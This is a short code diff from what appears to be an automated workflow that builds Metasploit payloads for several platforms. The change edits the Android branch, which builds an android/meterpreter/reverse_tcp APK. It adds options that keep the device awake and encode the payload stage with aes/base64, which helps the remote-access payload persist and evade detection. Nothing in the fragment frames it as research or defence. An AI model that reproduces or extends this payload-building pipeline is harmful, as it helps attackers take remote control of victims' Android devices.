@@ -47,7 +47,7 @@ jobs:
             "android")
               PAYLOAD="android/meterpreter/reverse_tcp"
               EXT="apk"
-              FORMAT_FLAG="" # apk格式不需要-f参数
+              FORMAT_FLAG="AndroidWakelock=true StageEncoder=aes/base64 AndroidUncrypt=true" # apk格式不需要-f参数
               PLATFORM="--platform android"
               ;;
             "linux")
